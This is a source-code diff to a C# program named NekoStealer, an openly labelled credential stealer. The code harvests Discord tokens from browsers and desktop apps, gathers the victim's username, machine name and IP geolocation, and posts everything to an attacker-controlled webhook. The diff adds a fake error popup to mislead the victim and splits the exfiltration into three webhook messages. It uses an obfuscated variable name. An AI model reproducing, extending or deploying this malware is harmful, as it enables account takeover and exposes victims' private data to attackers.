@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Threading.Tasks;
@@ -25,6 +25,8 @@ namespace NekoStealer
         [STAThread]
         static void Main() // Stealing tokens from Browsers and Apps
         {
+            if (Config.FakeError == true)
+                MessageBox.Show(Config.FakeErrorMessage); //Shows fake error if its enabled in Config.cs
             Task.WaitAll(
             Stealing.DiscordApp(),
             Stealing.DiscordCanary(),
@@ -45,7 +47,7 @@ namespace NekoStealer
 
             //Tokens
             string Tokens = string.Join(Environment.NewLine, goSendTokens.ToList());
-            
+
             // Getting IP Adress
             WebClient MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb = new WebClient();
             string IP = MلgغOSهوвKKVTQYcةش开PъбىOعcKiاb.DownloadString("https://ipapi.co/ip/");
@@ -201,8 +203,6 @@ namespace NekoStealer
                 }
                 return (sProcessorID);
             }
-
-            //Text, Avatar, Username.
             Dictionary<string, string> Token = new Dictionary<string, string>
                     {
                         { "content", "\n@everyone Meow! :cat:" +
@@ -230,7 +230,13 @@ namespace NekoStealer
                         "\n`        ██████      ██████                   ╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝░░  ╚══════╝░╚════╝░░╚═════╝░`" +
                         "\n========================= Information =========================" +
                         "\nUsername: " + username +
-                        "\nMachine Name: " + machinename +
+                        "\nMachine Name: " + machinename},
+                        { "avatar_url", Config.AvatarUrl},
+                        { "username", Config.Username}
+            };
+            Dictionary<string, string> Token2 = new Dictionary<string, string>
+                    {
+                        { "content",
                         "\n========================= Information =========================" +
                         "\n" +
                         "\n======================== IP Information ========================" +
@@ -247,7 +253,13 @@ namespace NekoStealer
                         "\nCountry Population: " + country_population_ip +
                         "\nCity: " + city_ip +
                         "\nRegion: " + region_ip +
-                        "\nRegion Code: " + region_code_ip +
+                        "\nRegion Code: " + region_code_ip },
+                        { "avatar_url", Config.AvatarUrl},
+                        { "username", Config.Username}
+            };
+            Dictionary<string, string> Token3 = new Dictionary<string, string>
+                    {
+                        { "content",
                         "\nLanguages" + languages_ip +
                         "\nContinent Code: " + continent_code_ip +
                         "\nEuropean Union: " + in_eu_ip +
@@ -270,13 +282,16 @@ namespace NekoStealer
                         "\n======================= Discord Tokens =======================" +
                         "\n" + Tokens +
                         "\n======================= Discord Tokens ======================="},
-                        { "avatar_url", Webhook.AvatarUrl},
-                        { "username", Webhook.Username}
+                        { "avatar_url", Config.AvatarUrl},
+                        { "username", Config.Username}
             };
-
             // Sending Webhook
             HttpClient cl = new HttpClient();
-            cl.PostAsync(Webhook.Url, new FormUrlEncodedContent(Token)).GetAwaiter().GetResult(); // FormUrlEncodedContent
+            cl.PostAsync(Config.Url, new FormUrlEncodedContent(Token)).GetAwaiter().GetResult(); 
+            Thread.Sleep(300);
+            cl.PostAsync(Config.Url, new FormUrlEncodedContent(Token2)).GetAwaiter().GetResult(); 
+            Thread.Sleep(300);
+            cl.PostAsync(Config.Url, new FormUrlEncodedContent(Token3)).GetAwaiter().GetResult(); 
         }
     }
 }
